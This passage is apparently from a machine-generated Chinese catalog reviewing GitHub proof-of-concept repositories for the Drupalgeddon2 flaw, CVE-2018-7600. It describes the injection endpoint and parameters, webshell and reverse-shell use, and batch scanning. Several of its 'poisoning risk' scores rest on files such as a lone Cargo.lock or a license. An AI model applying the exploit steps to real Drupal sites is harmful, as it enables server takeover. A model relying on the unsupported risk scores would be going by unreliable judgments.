CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
